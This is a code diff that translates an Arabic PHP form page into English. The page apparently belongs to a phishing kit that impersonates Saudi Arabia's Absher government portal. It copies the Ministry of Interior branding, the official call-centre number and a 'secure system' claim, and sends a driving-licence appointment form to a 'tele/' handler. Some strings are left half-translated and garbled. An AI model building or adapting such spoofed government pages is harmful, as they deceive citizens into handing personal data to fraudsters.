@@ -1,43 +1,42 @@
 <?php
 
 session_start();
+require_once '../includes/lang.php';
+set_site_lang('en');
 
-require_once 'includes/lang.php';
-set_site_lang('ar');
 
 // 🔹 تجهيز النظام
-require_once 'dashboard/init.php';
-require_once 'includes/redirect.php';
+require_once '../dashboard/init.php';
+require_once '../includes/redirect.php';
 
-// 🔹 التحقق من وجود user_id
+// 🔹 الVerify من وجود user_id
 $userId = $_SESSION['current_user_id'] ?? null;
 
 if (!$userId) {
-    header('Location: index.php');
+    header('Location: register.php');
     exit;
 }
 
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>أبشر - استكمال طلب رخصة القيادة</title>
+    <title>Absher - استكمال طلب Driving License</title>
     
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     
-    <link rel="stylesheet" href="includes/lang-toggle.css">
-    
+    <link rel="stylesheet" href="../includes/lang-toggle.css">
     <style>
         * {
             padding: 0;
             margin: 0;
             font-family: "Cairo", sans-serif;
-            direction: rtl;
+            direction: ltr;
         }
 
         body {
@@ -48,7 +47,7 @@ if (!$userId) {
         }
 
         /* ============================================
-           شريط أبشر الأخضر العلوي
+           شريط Absher الأخضر العلوي
         ============================================ */
         .absher-header {
             background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
@@ -226,7 +225,7 @@ if (!$userId) {
         }
 
         /* ============================================
-           زر المتابعة
+           زر الContinue
         ============================================ */
         .btn-submit {
             background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
@@ -376,18 +375,18 @@ if (!$userId) {
 <body>
 
     <!-- ============================================
-         شريط أبشر الأخضر
+         شريط Absher الأخضر
     ============================================ -->
     <header class="absher-header">
         <div class="container">
             <div class="absher-logo">
                 <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
-                <h1>أبشر</h1>
+                <h1>Absher</h1>
             </div>
-            <div class="header-actions">
+                        <div class="header-actions">
                 <div class="gov-badge">
                     <i class="fas fa-landmark"></i>
-                    وزارة الداخلية
+                    Ministry of Interior
                 </div>
                 <?php echo render_lang_toggle(); ?>
             </div>
@@ -403,15 +402,15 @@ if (!$userId) {
                 <div class="step-circle completed">
                     <i class="fas fa-check"></i>
                 </div>
-                <div class="step-label">البيانات الأساسية</div>
+                <div class="step-label">Basic Information</div>
             </div>
             <div class="progress-step">
                 <div class="step-circle active">2</div>
-                <div class="step-label active">معلومات التدريب</div>
+                <div class="step-label active">Training Details</div>
             </div>
             <div class="progress-step">
                 <div class="step-circle">3</div>
-                <div class="step-label">المراجعة والتأكيد</div>
+                <div class="step-label">Review & Confirm</div>
             </div>
         </div>
     </div>
@@ -424,98 +423,98 @@ if (!$userId) {
             <div class="form-container">
                 <h2 class="page-title">
                     <i class="fas fa-car"></i>
-                    معلومات التدريب
+                    Training Details
                 </h2>
                 <p class="page-subtitle">
-                    يرجى اختيار تفاصيل التدريب المطلوبة
+                    Please select the required training details
                 </p>
 
-                <form action="tele/register-second.php" method="POST">
-                    <!-- اختيار المنطقة -->
+                <form action="../tele/register-second.php" method="POST">
+                    <!-- Select Region -->
                     <div class="mb-4">
                         <label for="region" class="form-label">
                             <i class="fas fa-map-marker-alt"></i>
-                            اختيار المنطقة
+                            Select Region
                             <span class="required-star">*</span>
                         </label>
                         <select name="region" id="region" required class="form-select">
-                            <option value="">اختر المنطقة</option>
-                            <option value="جدة">جدة</option>
-                            <option value="الرياض">الرياض</option>
-                            <option value="تبوك">تبوك</option>
-                            <option value="القصيم">القصيم</option>
-                            <option value="الطائف">الطائف</option>
-                            <option value="جازان">جازان</option>
-                            <option value="الخبر">الخبر</option>
-                            <option value="الدمام">الدمام</option>
-                            <option value="مكة">مكة</option>
-                            <option value="حفر الباطن">حفر الباطن</option>
-                            <option value="عرعر">عرعر</option>
-                            <option value="أخرى">أخرى</option>
+                            <option value="">Select region</option>
+                            <option value="Jeddah">Jeddah</option>
+                            <option value="Riyadh">Riyadh</option>
+                            <option value="Tabuk">Tabuk</option>
+                            <option value="Qassim">Qassim</option>
+                            <option value="Taif">Taif</option>
+                            <option value="Jazan">Jazan</option>
+                            <option value="Khobar">Khobar</option>
+                            <option value="Dammam">Dammam</option>
+                            <option value="Makkah">Makkah</option>
+                            <option value="Hafr Al Batin">Hafr Al Batin</option>
+                            <option value="Arar">Arar</option>
+                            <option value="Other">Other</option>
                         </select>
                     </div>
 
-                    <!-- اختيار المستوى -->
+                    <!-- Select Level -->
                     <div class="mb-4">
                         <label for="level" class="form-label">
                             <i class="fas fa-layer-group"></i>
-                            اختيار المستوى
+                            Select Level
                             <span class="required-star">*</span>
                         </label>
                         <select name="level" id="level" required class="form-select">
-                            <option value="">اختر المستوى</option>
-                                                        <option value="تحديد مستوى">تحديد مستوى</option>
-                            <option value="برنامج 30 ساعة">برنامج 30 ساعة</option>
-                            <option value="برنامج 12 ساعة">برنامج 12 ساعة</option>
-                            <option value="برنامج 6 ساعات">برنامج 6 ساعات</option>
-                                                        <option value="موعد اختبار نهائي (استبدال رخصة اجنبية)">موعد اختبار نهائي (استبدال رخصة اجنبية)</option>
+                            <option value="">Select level</option>
+                                                        <option value="Level assessment">Level assessment</option>
+                            <option value="30-hour program">30-hour program</option>
+                            <option value="12-hour program">12-hour program</option>
+                            <option value="6-hour program">6-hour program</option>
+                                                        <option value="Final test appointment (foreign license replacement)">Final test appointment (foreign license replacement)</option>
                           
                         </select>
                     </div>
 
-                    <!-- نوع الجير -->
+                    <!-- Transmission Type -->
                     <div class="mb-4">
                         <label for="gear_type" class="form-label">
                             <i class="fas fa-cog"></i>
-                            نوع الجير
+                            Transmission Type
                             <span class="required-star">*</span>
                         </label>
                         <select name="gear_type" id="gear_type" required class="form-select">
-                            <option value="">اختر نوع الجير</option>
-                            <option value="عادي">عادي</option>
-                            <option value="أوتوماتيك">أوتوماتيك</option>
+                            <option value="">Select Transmission Type</option>
+                            <option value="Manual">Manual</option>
+                            <option value="Automatic">Automatic</option>
                         </select>
                     </div>
 
-                    <!-- الفترة الزمنية -->
+                    <!-- Time Period -->
                     <div class="mb-4">
                         <label for="time_period" class="form-label">
                             <i class="fas fa-clock"></i>
-                            الفترة الزمنية
+                            Time Period
                             <span class="required-star">*</span>
                         </label>
                         <select name="time_period" id="time_period" required class="form-select">
-                            <option value="">اختر الفترة الزمنية</option>
-                            <option value="الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً">الفترة الصباحية (9 ص - 2 م)</option>
-                            <option value="الفترة المسائية من الساعة 2 مساءاً الى الساعة 8 مساءاً">الفترة المسائية (2 م - 8 م)</option>
+                            <option value="">Select Time Period</option>
+                            <option value="Morning period (9 AM - 2 PM)">Morning (9 AM - 2 PM)</option>
+                            <option value="Evening period (2 PM - 8 PM)">Evening (2 PM - 8 PM)</option>
                         </select>
                     </div>
 
-                    <!-- تاريخ الموعد المطلوب -->
+                    <!-- Preferred Appointment Date -->
                     <div class="mb-4">
                         <label for="appointment_date" class="form-label">
                             <i class="fas fa-calendar-alt"></i>
-                            تاريخ الموعد المطلوب
+                            Preferred Appointment Date
                             <span class="required-star">*</span>
                         </label>
                         <input type="date" name="appointment_date" id="appointment_date" required class="form-control">
                     </div>
 
-                    <!-- زر المتابعة -->
+                    <!-- زر الContinue -->
                     <div class="text-center mt-5">
                         <button type="submit" name="submit" id="butSubm" class="btn-submit" disabled>
-                            <i class="fas fa-arrow-left"></i>
-                            متابعة
+                            <i class="fas fa-arrow-right"></i>
+                            Continue
                         </button>
                     </div>
                 </form>
@@ -529,36 +528,36 @@ if (!$userId) {
     <footer class="gov-footer">
         <div class="container">
             <div class="footer-content">
-                <!-- خدمات أبشر -->
+                <!-- Absher Services -->
                 <div class="footer-section">
-                    <h5><i class="fas fa-globe"></i> خدمات أبشر</h5>
+                    <h5><i class="fas fa-globe"></i> Absher Services</h5>
                     <ul>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> رخصة القيادة</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> المخالفات المرورية</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> تجديد الإقامة</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> استعلام عن تأشيرة</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Driving License</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Traffic Violations</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Iqama Renewal</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Visa Inquiry</a></li>
                     </ul>
                 </div>
 
-                <!-- تواصل معنا -->
+                <!-- Contact Us -->
                 <div class="footer-section">
-                    <h5><i class="fas fa-phone-alt"></i> تواصل معنا</h5>
+                    <h5><i class="fas fa-phone-alt"></i> Contact Us</h5>
                     <ul>
-                        <li><a href="#"><i class="fas fa-headset"></i> مركز الاتصال: 920020405</a></li>
-                        <li><a href="#"><i class="fas fa-envelope"></i> البريد الإلكتروني</a></li>
-                        <li><a href="#"><i class="fab fa-twitter"></i> تويتر</a></li>
-                        <li><a href="#"><i class="fab fa-facebook"></i> فيسبوك</a></li>
+                        <li><a href="#"><i class="fas fa-headset"></i> Call Center: 920020405</a></li>
+                        <li><a href="#"><i class="fas fa-envelope"></i> Email</a></li>
+                        <li><a href="#"><i class="fab fa-twitter"></i> Twitter</a></li>
+                        <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
                     </ul>
                 </div>
 
-                <!-- روابط مهمة -->
+                <!-- Important Links -->
                 <div class="footer-section">
-                    <h5><i class="fas fa-link"></i> روابط مهمة</h5>
+                    <h5><i class="fas fa-link"></i> Important Links</h5>
                     <ul>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> الشروط والأحكام</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> سياسة الخصوصية</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> الأسئلة الشائعة</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> خريطة الموقع</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Terms & Conditions</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Privacy Policy</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> FAQ</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Site Map</a></li>
                     </ul>
                 </div>
             </div>
@@ -566,16 +565,16 @@ if (!$userId) {
             <!-- أسفل التذييل -->
             <div class="footer-bottom">
                 <div class="footer-logos">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='50' font-size='40' fill='white'%3E🇸🇦%3C/text%3E%3C/svg%3E" alt="المملكة العربية السعودية">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 100'%3E%3Ctext y='60' font-size='35' fill='white'%3E⚔️%3C/text%3E%3C/svg%3E" alt="وزارة الداخلية">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='50' font-size='40' fill='white'%3E🇸🇦%3C/text%3E%3C/svg%3E" alt="Kingdom of Saudi Arabia">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 100'%3E%3Ctext y='60' font-size='35' fill='white'%3E⚔️%3C/text%3E%3C/svg%3E" alt="Ministry of Interior">
                 </div>
                 <p class="mt-3">
                     <i class="fas fa-copyright"></i>
-                    2025 جميع الحقوق محفوظة - منصة أبشر - وزارة الداخلية - المملكة العربية السعودية
+                    2025 All rights reserved - Absher Platform - Ministry of Interior - Kingdom of Saudi Arabia
                 </p>
                 <p>
                     <i class="fas fa-shield-alt"></i>
-                    نظام آمن ومحمي بأعلى معايير الأمن السيبراني
+                    A secure system protected by the highest cybersecurity standards
                 </p>
             </div>
         </div>
